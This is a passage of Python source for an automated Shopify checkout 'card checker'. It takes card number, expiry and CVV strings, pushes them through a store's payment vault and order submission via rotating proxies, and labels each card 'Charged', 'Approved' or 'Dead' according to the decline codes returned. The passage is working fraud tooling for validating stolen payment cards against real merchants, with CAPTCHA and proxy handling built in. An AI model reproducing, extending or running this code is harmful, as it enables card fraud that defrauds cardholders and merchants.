                proposal_payload["id"] = "ab9f6891d952494319a7dc077b627ed5e468a855944d95806ee91c1e64a1edad"
                proposal_payload.pop("query", None)

            try:
                proposal_text = await gql(proposal_payload)
            except Exception as e:
                return False, f"Proposal error: {str(e)[:80]}", gateway, "0.00", currency, False

            if _is_captcha_required(proposal_text):
                return False, "CAPTCHA_REQUIRED", gateway, "0.00", currency, proxy_ok

            try:
                proposal_json = json.loads(proposal_text)
            except Exception:
                return False, "Invalid proposal JSON", gateway, "0.00", currency, proxy_ok
            if "errors" in proposal_json:
                return False, f"GraphQL Error: {str(proposal_json['errors'])[:100]}", gateway, "0.00", currency, proxy_ok

            sess = proposal_json.get("data", {}).get("session", {})
            result = sess.get("negotiate", {}).get("result", {})
            if not result or result.get("__typename") != "NegotiationResultAvailable":
                return False, "No valid negotiation result", gateway, "0.00", currency, proxy_ok

            checkpoint = result.get("checkpointData")
            seller = result.get("sellerProposal", {})
            if not seller:
                return False, "No seller proposal", gateway, "0.00", currency, proxy_ok

            delivery_strategy = ""
            shipping_amount = 0.0
            if requires_shipping:
                d = seller.get("delivery", {})
                if d.get("__typename") == "FilledDeliveryTerms":
                    dlines = d.get("deliveryLines", [{}])
                    strategies = dlines[0].get("availableDeliveryStrategies", []) if dlines else []
                    if strategies:
                        def _sp(s):
                            try:
                                return float(s.get("amount", {}).get("value", {}).get("amount") or 999999)
                            except (ValueError, TypeError):
                                return 999999.0
                        cheapest = min(strategies, key=_sp)
                        delivery_strategy = cheapest.get("handle", "")
                        shipping_amount = _sp(cheapest)
                        if shipping_amount >= 999999:
                            shipping_amount = 0.0

            tax_amount = 0.0
            tx = seller.get("tax", {})
            if tx and tx.get("totalTaxAmount"):
                try:
                    tax_amount = float(tx["totalTaxAmount"].get("value", {}).get("amount", "0"))
                except (ValueError, TypeError):
                    pass

            pay = seller.get("payment", {})
            if pay.get("__typename") == "FilledPaymentTerms":
                for line in pay.get("availablePaymentLines", []):
                    pm = line.get("paymentMethod", {})
                    if pm.get("paymentMethodIdentifier"):
                        payment_identifier = pm["paymentMethodIdentifier"]
                        gateway = (pm.get("extensibilityDisplayName")
                                    or pm.get("name") or "Shopify")
                        break
            if not payment_identifier:
                return False, "No payment method available", gateway, "0.00", currency, proxy_ok

            delivery_op = _get_op(Q_PROPOSAL) or "Proposal"
            proposal_payload["operationName"] = delivery_op
            if requires_shipping:
                line = {
                    "destination": {"streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": firstName, "lastName": lastName,
                        "zoneCode": state, "phone": phone,
                    }},
                    "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {
                        "handle": delivery_strategy, "customDeliveryRate": False,
                    }, "options": {"phone": phone}},
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"value": {"amount": str(shipping_amount),
                                                      "currencyCode": currency}},
                    "destinationChanged": False,
                }
                proposal_payload["variables"]["delivery"] = {
                    "deliveryLines": [line], "noDeliveryRequired": [],
                    "useProgressiveRates": True, "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                }
            else:
                proposal_payload["variables"]["delivery"] = {
                    "deliveryLines": [],
                    "noDeliveryRequired": [{"stableId": stable_id}],
                    "useProgressiveRates": True, "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                }
            proposal_payload["variables"]["payment"]["billingAddress"] = {"streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": country_code, "postalCode": s_zip,
                "firstName": firstName, "lastName": lastName,
                "zoneCode": state, "phone": phone,
            }}
            proposal_payload["variables"]["taxes"]["proposedTotalAmount"] = {
                "value": {"amount": str(tax_amount), "currencyCode": currency}
            }
            proposal_payload["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone

            try:
                d_text = await gql(proposal_payload)
            except Exception as e:
                return False, f"Delivery proposal error: {str(e)[:80]}", gateway, "0.00", currency, False

            if _is_captcha_required(d_text):
                return False, "CAPTCHA on delivery", gateway, "0.00", currency, proxy_ok

            try:
                d_json = json.loads(d_text)
            except Exception:
                return False, "Invalid delivery JSON", gateway, "0.00", currency, proxy_ok
            if "errors" in d_json:
                e0 = (d_json["errors"] or [{}])[0]
                return False, f"Delivery error: {str(e0)[:100]}", gateway, "0.00", currency, proxy_ok

            d_res = d_json.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
            if not d_res or d_res.get("__typename") != "NegotiationResultAvailable":
                return False, "Invalid delivery result", gateway, "0.00", currency, proxy_ok

            if d_res.get("queueToken"):
                queue_token = d_res["queueToken"]
            if d_res.get("checkpointData"):
                checkpoint = d_res["checkpointData"]

            d_seller = d_res.get("sellerProposal", {})
            if not d_seller:
                return False, "No seller from delivery", gateway, "0.00", currency, proxy_ok

            dpay = d_seller.get("payment", {})
            if dpay.get("__typename") == "FilledPaymentTerms":
                for line in dpay.get("availablePaymentLines", []):
                    pm = line.get("paymentMethod", {})
                    if pm.get("paymentMethodIdentifier"):
                        payment_identifier = pm["paymentMethodIdentifier"]
                        gateway = (pm.get("extensibilityDisplayName")
                                    or pm.get("name") or "Shopify")
                        break

            payment_stable_id = None
            payment_instructions = None
            payment_due_at = None
            plines = d_seller.get("payment", {}).get("paymentLines", [])
            if plines:
                payment_stable_id = plines[0].get("stableId")
                payment_instructions = plines[0].get("specialInstructions")
                payment_due_at = plines[0].get("dueAt")

            merch_stable_id = None
            merch_total = None
            mlines = d_seller.get("merchandise", {}).get("merchandiseLines", [])
            if mlines:
                merch_stable_id = mlines[0].get("stableId")
                merch_total = mlines[0].get("totalAmount", {}).get("value", {}).get("amount")

            dtx = d_seller.get("tax", {})
            if dtx and dtx.get("totalTaxAmount"):
                try:
                    tax_amount = float(dtx["totalTaxAmount"].get("value", {}).get("amount", tax_amount))
                except (ValueError, TypeError):
                    pass

            if requires_shipping:
                sd = d_seller.get("delivery", {})
                if sd.get("__typename") == "FilledDeliveryTerms":
                    dl = sd.get("deliveryLines", [{}])
                    if dl:
                        selected = dl[0].get("selectedDeliveryStrategy", {}).get("handle")
                        avail = dl[0].get("availableDeliveryStrategies", [])
                        if selected:
                            for s in avail:
                                if s.get("handle") == selected:
                                    shipping_amount = float(s.get("amount", {}).get("value", {}).get("amount", "0"))
                                    break
                        elif avail:
                            shipping_amount = float(avail[0].get("amount", {}).get("value", {}).get("amount", "0"))
                        if selected:
                            proposal_payload["variables"]["delivery"]["deliveryLines"][0] \
                                ["selectedDeliveryStrategy"]["deliveryStrategyByHandle"]["handle"] = selected
                if merch_stable_id:
                    proposal_payload["variables"]["delivery"]["deliveryLines"][0] \
                        ["targetMerchandiseLines"]["lines"][0]["stableId"] = merch_stable_id
                proposal_payload["variables"]["delivery"]["deliveryLines"][0]["destinationChanged"] = False
            else:
                if merch_stable_id:
                    proposal_payload["variables"]["delivery"]["noDeliveryRequired"][0]["stableId"] = merch_stable_id

            final_total = None
            final_currency = currency
            for field in ("checkoutTotal", "total", "runningTotal"):
                v = d_seller.get(field, {})
                if not v:
                    continue
                amt = v.get("value", {}).get("amount") if isinstance(v.get("value"), dict) else v.get("amount")
                cur = v.get("value", {}).get("currencyCode") if isinstance(v.get("value"), dict) else v.get("currencyCode")
                if amt is not None:
                    final_total = str(amt)
                    if cur:
                        final_currency = cur
                    break
            if final_total is None:
                try:
                    final_total = str(Decimal(str(merch_total or subtotal))
                                       + Decimal(str(shipping_amount or 0))
                                       + Decimal(str(tax_amount or 0)))
                except Exception:
                    final_total = str(merch_total or subtotal or "0.01")
            currency = final_currency
            try:
                if float(final_total) <= 0:
                    final_total = str(max(0.01, float(merch_total or subtotal or "0.01")))
            except (ValueError, TypeError):
                final_total = merch_total or subtotal or "0.01"

            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv,
                    "name": f"{firstName} {lastName}",
                },
                "payment_session_scope": urlparse(ourl).netloc,
            }
            vault_headers = {
                "Content-Type": "application/json", "Accept": "application/json",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "User-Agent": headers["User-Agent"],
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            token = None
            strategies = [
                {"json": vault_payload, "headers": vault_headers, "proxy": proxy_url},
                {"json": {**vault_payload, "credit_card": {
                    **vault_payload["credit_card"], "number": re.sub(r"\s", "", cc)}},
                 "headers": vault_headers, "proxy": proxy_url},
                {"json": vault_payload, "headers": vault_headers, "proxy": None},
            ]
            for strat in strategies:
                try:
                    async with session.post(
                        "https://checkout.pci.shopifyinc.com/sessions",
                        json=strat["json"], headers=strat["headers"],
                        proxy=strat["proxy"], timeout=8,
                    ) as vr:
                        if vr.status in (200, 201):
                            vd = await vr.json()
                            token = vd.get("id")
                            if token:
                                break
                except Exception:
                    if strat["proxy"] is not None:
                        proxy_ok = False
                    continue
            if not token:
                return False, "Unable to get payment token", gateway, attempted_price, currency, proxy_ok

            payment_line = {
                "paymentMethod": {"directPaymentMethod": {
                    "paymentMethodIdentifier": payment_identifier,
                    "sessionId": token,
                    "billingAddress": {"streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": firstName, "lastName": lastName,
                        "zoneCode": state, "phone": phone,
                    }},
                    "cardSource": None,
                }},
                "amount": {"value": {"amount": final_total, "currencyCode": currency}},
                "dueAt": payment_due_at,
            }
            if payment_stable_id:
                payment_line["stableId"] = payment_stable_id
            if payment_instructions:
                payment_line["specialInstructions"] = payment_instructions

            submit_vars = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": proposal_payload["variables"]["delivery"],
                    "merchandise": {"merchandiseLines": [{
                        "stableId": merch_stable_id or stable_id,
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                        }},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {"amount": str(merch_total or subtotal),
                                                          "currencyCode": currency}},
                        "lineComponentsSource": None, "lineComponents": [],
                    }]},
                    "payment": {
                        "totalAmount": {"value": {"amount": final_total, "currencyCode": currency}},
                        "paymentLines": [payment_line],
                        "billingAddress": {"streetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": firstName, "lastName": lastName,
                            "zoneCode": state, "phone": phone,
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                        "rememberMe": False,
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": str(tax_amount),
                                                           "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None, "proposedExemptions": [],
                    },
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url},
            }
            if checkpoint:
                submit_vars["input"]["checkpointData"] = checkpoint

            submit_op = _get_op(Q_SUBMIT) or "SubmitForCompletion"
            submit_payload = {"query": Q_SUBMIT, "variables": submit_vars,
                              "operationName": submit_op}
            if use_persisted:
                submit_payload["id"] = "ab9f6891d952494319a7dc077b627ed5e468a855944d95806ee91c1e64a1edad"
                submit_payload.pop("query", None)

            try:
                s_text = await gql(submit_payload)
            except Exception as e:
                return False, f"Submit error: {str(e)[:80]}", gateway, attempted_price, currency, False

            if _is_captcha_required(s_text):
                return False, "CAPTCHA on submit", gateway, attempted_price, currency, proxy_ok

            try:
                s_json = json.loads(s_text)
            except json.JSONDecodeError:
                return False, "Invalid submit JSON", gateway, attempted_price, currency, proxy_ok

            if "errors" in s_json:
                e0 = (s_json["errors"] or [{}])[0]
                code = e0.get("extensions", {}).get("code", "")
                msg = e0.get("message", "")
                return False, f"GRAPHQL_ERROR: {code} - {msg}".strip(": -"), gateway, attempted_price, currency, proxy_ok

            s_data = s_json.get("data", {}).get("submitForCompletion", {})
            if not s_data:
                return False, "No submit data", gateway, attempted_price, currency, proxy_ok
            rtype = s_data.get("__typename", "")

            if rtype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = s_data.get("receipt") or {}
                rid = receipt.get("id")
                if not rid:
                    return False, "No receipt ID", gateway, attempted_price, currency, proxy_ok
                po = s_data.get("purchaseOrder") or receipt.get("purchaseOrder") or {}
                ta = po.get("totalAmountToPay") or {}
                if ta:
                    if isinstance(ta.get("value"), dict):
                        final_total = str(ta["value"].get("amount", final_total))
                        currency = ta["value"].get("currencyCode") or currency
            elif rtype == "SubmitFailed":
                reason = s_data.get("reason", "Unknown")
                return False, _extract_clean_response(reason), gateway, attempted_price, currency, proxy_ok
            elif rtype == "SubmitRejected":
                errs = s_data.get("errors", [])
                code = errs[0].get("code", "") if errs else "SUBMIT_REJECTED"
                return False, code or "SUBMIT_REJECTED", gateway, attempted_price, currency, proxy_ok
            elif rtype in ("Throttled", "CheckpointDenied"):
                return False, rtype, gateway, attempted_price, currency, proxy_ok
            else:
                return False, f"Unknown submit type: {rtype}", gateway, attempted_price, currency, proxy_ok

            poll_op = _get_op(Q_POLL) or "PollForReceipt"
            poll_payload = {"query": Q_POLL,
                            "variables": {"receiptId": rid, "sessionToken": sst},
                            "operationName": poll_op}
            if use_persisted:
                poll_payload["id"] = "ab9f6891d952494319a7dc077b627ed5e468a855944d95806ee91c1e64a1edad"
                poll_payload.pop("query", None)

            poll_data = {}
            for attempt in range(8):
                if attempt > 0:
                    delay = 0.5
                    if poll_data and poll_data.get("__typename") in ("ProcessingReceipt", "WaitingReceipt"):
                        delay = min(poll_data.get("pollDelay", 500) / 1000.0, 4.0)
                    await asyncio.sleep(max(0.2, min(delay, 0.8)))

                try:
                    p_text = await gql(poll_payload)
                except Exception as e:
                    return False, f"Poll error: {str(e)[:80]}", gateway, final_total, currency, False

                if _is_captcha_required(p_text):
                    return True, "CARD_DECLINED", gateway, final_total, currency, proxy_ok

                try:
                    poll_data = json.loads(p_text).get("data", {}).get("receipt", {})
                    tn = poll_data.get("__typename", "")

                    if tn == "ProcessedReceipt":
                        return True, random.choice(["Order Confirm", "ORDER_PAID"]), \
                               gateway, final_total, currency, proxy_ok
                    elif tn == "FailedReceipt":
                        err = poll_data.get("processingError", {})
                        if err.get("__typename") == "PaymentFailed":
                            code = err.get("code", "")
                            msg = err.get("messageUntranslated", "")
                            if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and msg:
                                return True, msg, gateway, final_total, currency, proxy_ok
                            return True, code or "CARD_DECLINED", gateway, final_total, currency, proxy_ok
                        return True, "FAILED", gateway, final_total, currency, proxy_ok
                    elif tn == "ActionRequiredReceipt":
                        return True, "OTP_REQUIRED", gateway, final_total, currency, proxy_ok
                except Exception:
                    continue

            return False, "Poll timeout", gateway, final_total, currency, proxy_ok

    except Exception as e:
        log.error(f"checkout error: {e}\n{traceback.format_exc()}")
        return False, f"Error Processing Card: {str(e)[:100]}", gateway, attempted_price, currency, proxy_ok


# ══════════════════════════════════════════════════════════════════════
#  PUBLIC API
# ══════════════════════════════════════════════════════════════════════
def _classify(success: bool, message: str, proxy_ok: bool) -> tuple:
    msg = (message or "").strip()
    ml = msg.lower()

    if not proxy_ok or ("proxy" in ml and "error" in ml):
        return "Error", "PROXY_ERROR", True
    if "timeout" in ml and ("proxy" in ml or "site" in ml):
        return "Error", "TIMEOUT", True
    if "cart failed" in ml or "product fetch failed" in ml:
        return "Error", "SITE_ERROR", True
    if "dead_store" in ml:
        return "Error", "DEAD_STORE", False
    if "site requires login" in ml:
        return "Error", "REQUIRES_LOGIN", False
    if "captcha" in ml:
        return "Error", "CAPTCHA", True
    if "no payment method" in ml or "no seller" in ml or "no receipt" in ml:
        return "Error", "NO_PAYMENT", True

    if success:
        if "order confirm" in ml or "order_paid" in ml:
            return "Charged", "ORDER_PLACED", False
        if any(k in ml for k in ("otp_required", "3ds", "authentication_required")):
            return "Approved", "3DS_REQUIRED", False
        if any(k in ml for k in ("insufficient_funds", "insufficient funds")):
            return "Approved", "INSUFFICIENT_FUNDS", False
        if any(k in ml for k in ("incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv")):
            return "Approved", "INCORRECT_CVC", False
        if any(k in ml for k in ("incorrect_zip", "avs")):
            return "Approved", "INCORRECT_ZIP", False
        return "Approved", msg.upper() or "DECLINED", False

    return "Dead", msg.upper() or "DECLINED", False


def run_shopify_check(site: str, card: str, proxy_str: str = None,
                       variant_id: str = None) -> dict:
    t0 = time.time()
    result = {
        "status": "Error", "message": "unknown", "card": card,
        "gateway": "Shopify", "price": "-", "price_value": 0.0,
        "site": site, "status_code": "ERROR", "retryable": True,
        "elapsed": 0.0,
    }

    parts = card.split("|")
    if len(parts) != 4:
        result["message"] = "Invalid card format"
        result["status_code"] = "CARD_INVALID"
        result["retryable"] = False
        result["elapsed"] = round(time.time() - t0, 2)
        return result

    cc, mes, ano, cvv = [p.strip() for p in parts]

    loop = asyncio.new_event_loop()
    try:
        asyncio.set_event_loop(loop)
        success, message, gateway, price, currency, proxy_ok = loop.run_until_complete(
            asyncio.wait_for(
                _process_card(cc, mes, ano, cvv, site, variant_id, proxy_str),
                timeout=REQUEST_TIMEOUT,
            )
        )
    except asyncio.TimeoutError:
        result["message"] = "TIMEOUT"
        result["status_code"] = "TIMEOUT"
        result["elapsed"] = round(time.time() - t0, 2)
        return result
    except Exception as e:
        result["message"] = f"engine: {str(e)[:100]}"
        result["status_code"] = "ENGINE_EXCEPTION"
        result["elapsed"] = round(time.time() - t0, 2)
        return result
    finally:
        try:
            pending = asyncio.all_tasks(loop)
            for task in pending:
                task.cancel()
            if pending:
                loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
        except Exception:
            pass
        loop.close()

    status, code, retryable = _classify(success, message, proxy_ok)

    price_str = "-"
    price_val = 0.0
    try:
        pv = float(str(price).replace("$", ""))
        if pv > 0:
            price_str = f"${pv:.2f}"
            price_val = pv
    except (ValueError, TypeError):
        pass

    return {
        "status":       status,
        "message":      str(message or code)[:150],
        "card":         card,
        "gateway":      gateway or "Shopify",
        "price":        price_str,
        "price_value":  price_val,
        "site":         site,
        "status_code":  code,
        "retryable":    retryable,
        "elapsed":      round(time.time() - t0, 2),
    }


def is_proxy_alive(proxy_url: str, timeout: float = 6.0) -> bool:
    if not proxy_url:
        return False
    try:
        p = parse_proxy(proxy_url)
        if not p:
            return False

        async def _check():
            proxy_url_aio = _proxy_for_aiohttp(p)
            connector = _make_connector(p)
            async with aiohttp.ClientSession(connector=connector) as s:
                async with s.get(
                    "https://cdn.shopify.com/s/files/1/0000/favicon.ico",
                    proxy=proxy_url_aio, timeout=timeout, allow_redirects=False,
                ) as r:
                    return r.status < 500
        loop = asyncio.new_event_loop()
        try:
            return loop.run_until_complete(_check())
        finally:
            loop.close()
    except Exception:
        return False


def ledger_clear():
    global _cache
    with _cache_lock:
        _cache.clear()
    _save_variant_cache()


def ledger_stats() -> dict:
    _load_variant_cache()
    return {"cached": len(_cache)}